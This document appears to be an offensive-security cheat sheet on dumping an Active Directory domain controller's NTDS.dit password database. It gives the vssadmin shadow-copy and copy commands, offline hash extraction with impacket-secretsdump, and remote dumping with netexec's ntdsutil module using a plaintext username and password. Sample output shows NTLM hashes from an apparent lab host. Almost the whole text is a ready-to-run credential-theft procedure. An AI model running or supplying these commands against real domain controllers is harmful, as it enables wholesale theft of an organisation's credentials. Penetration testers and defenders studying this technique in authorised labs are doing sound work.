---
title: Dump NTDS
date: 2025-11-26 10:32:48
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Dump-Passwords
tags:
  - Dump-NTDS
---

➜ Required privilege

  * `Member of Domain Admins (DA)`

  * `Member of Enterprise Admins (EA)`

  * `Member of local Administrators group on the DC`

  * `Backup Operators ( SeBackupPrivilege )`

# Offline

### Creating shadow copy of C:

```bash
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copying NTDS.dit from the VSS

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

### Dump hashes

➜ Since the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`, we need to transfer the `SYSTEM` registry with `NTDS.dit`

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

# Remotely

### NetExec

```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
